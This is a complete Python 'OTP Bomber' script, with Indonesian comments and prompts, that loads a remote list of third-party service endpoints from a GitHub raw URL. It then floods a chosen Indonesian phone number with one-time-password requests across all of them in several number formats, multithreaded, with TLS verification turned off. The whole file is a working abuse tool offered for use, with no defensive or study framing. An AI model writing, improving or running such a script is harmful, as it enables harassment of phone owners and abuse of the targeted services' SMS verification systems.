import json
import requests
import time
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import RequestException

# Menonaktifkan warning untuk SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class OTPSender:
    def __init__(self):
        self.session = requests.Session()
        self.services = self.load_services()
        
    def load_services(self):
        url = "https://raw.githubusercontent.com/YoshCasaster/verifikasi-sotp/refs/heads/main/otp_config.json"
        try:
            response = self.session.get(url, timeout=30)
            response.raise_for_status()
            return json.loads(response.text)
        except Exception as e:
            print(f"Error loading services: {str(e)}")
            return []

    def send_otp(self, service, phone):
        try:
            # Mengubah string data menjadi dict
            if isinstance(service['data'], str):
                data = json.loads(service['data'].replace("'", "\""))
            else:
                data = service['data']

            # Update nomor telepon dalam data
            phone_keys = ['phoneNumber', 'user_phone', 'phone', 'hp', 'mobile']
            for key in phone_keys:
                if key in data:
                    data[key] = phone
                    break

            # Set headers
            headers = service['headers']
            
            # Tentukan content type
            is_json = headers.get('Content-Type', '').lower().startswith('application/json')
            
            # Kirim request
            response = self.session.post(
                service['url'],
                json=data if is_json else None,
                data=data if not is_json else None,
                headers=headers,
                verify=False,  # Menonaktifkan SSL verification
                timeout=30,
                allow_redirects=True
            )
            
            return {
                'service': service['name'],
                'status': response.status_code,
                'response': response.text[:100] if response.text else 'No response body'
            }
            
        except RequestException as e:
            return {
                'service': service['name'],
                'status': 'error',
                'response': f"Request error: {str(e)}"
            }
        except Exception as e:
            return {
                'service': service['name'],
                'status': 'error',
                'response': f"General error: {str(e)}"
            }

    def start_bombing(self, phone_number, delay=60):
        phone_formats = [
            f"+62{phone_number}",
            f"62{phone_number}",
            f"0{phone_number}"
        ]
        
        total_success = 0
        total_failed = 0
        
        print(f"\nStarting OTP bombing for number: {phone_number}")
        
        for phone_format in phone_formats:
            print(f"\nUsing format: {phone_format}")
            
            with ThreadPoolExecutor(max_workers=3) as executor:  # Mengurangi jumlah workers
                futures = []
                for service in self.services:
                    futures.append(
                        executor.submit(self.send_otp, service, phone_format)
                    )
                
                for future in futures:
                    result = future.result()
                    status_code = result['status']
                    
                    # Menampilkan hasil dengan warna
                    if isinstance(status_code, int) and 200 <= status_code < 300:
                        print(f"\033[92mService: {result['service']}")  # Hijau
                        print(f"Status: {status_code} (Success)")
                        total_success += 1
                    else:
                        print(f"\033[91mService: {result['service']}")  # Merah
                        print(f"Status: {status_code} (Failed)")
                        total_failed += 1
                    
                    print(f"Response: {result['response']}\033[0m")
                    print("-" * 50)
            
            print(f"\nResults for {phone_format}:")
            print(f"Success: {total_success}")
            print(f"Failed: {total_failed}")
            
            if delay > 0:
                print(f"Waiting {delay} seconds before next format...")
                time.sleep(delay)

def main():
    bomber = OTPSender()
    
    while True:
        print("\n\033[95mOTP Bomber\033[0m")  # Magenta
        print("=" * 30)
        
        phone = input("Masukkan nomor telepon (8xxx): ")
        
        if not phone.isdigit() or not phone.startswith('8'):
            print("\033[91mNomor tidak valid! Gunakan format 8xxx...\033[0m")
            continue
        
        try:
            delay = int(input("Masukkan delay antar format (detik, default 60): ") or 60)
        except ValueError:
            delay = 60
        
        bomber.start_bombing(phone, delay)
        
        if input("\nLanjutkan ke nomor lain? (y/n): ").lower() != 'y':
            break

if __name__ == "__main__":
    main()